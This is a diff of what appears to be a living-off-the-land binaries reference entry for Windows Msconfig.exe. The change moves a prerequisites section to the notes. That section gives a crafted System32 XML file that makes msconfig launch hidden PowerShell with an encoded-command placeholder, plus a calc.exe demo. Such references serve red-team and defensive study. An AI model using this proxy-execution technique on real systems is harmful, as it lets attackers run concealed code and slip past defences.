@@ -1,16 +1,5 @@
 ## Msconfig.exe
 
-* Prerequisites
-
-add a crafted .xml in System32
-```
-<?xml version="1.0" ?> 
-<MSCONFIGTOOLS> 
-<a NAME="LOLBin" PATH="%windir%\System32\WindowsPowerShell\v1.0\powershell.exe" 
-DEFAULT_OPT="-nop -sta -enc -w 1 YOURBASE64" ADV_OPT="-command calc.exe" HELP="LOLBin MSCONFIGTOOLS"/> 
-</MSCONFIGTOOLS>
-```
-
 * Functions: Execute
 
 ```
@@ -31,7 +20,14 @@ c:\windows\system32\msconfig.exe
 ```
 
 Notes:
+* Prerequisites
+add a crafted .xml in System32
 
-
-
+```
+<?xml version="1.0" ?> 
+<MSCONFIGTOOLS> 
+<a NAME="LOLBin" PATH="%windir%\System32\WindowsPowerShell\v1.0\powershell.exe" 
+DEFAULT_OPT="-nop -sta -enc -w 1 YOURBASE64" ADV_OPT="-command calc.exe" HELP="LOLBin MSCONFIGTOOLS"/> 
+</MSCONFIGTOOLS>
+```
  
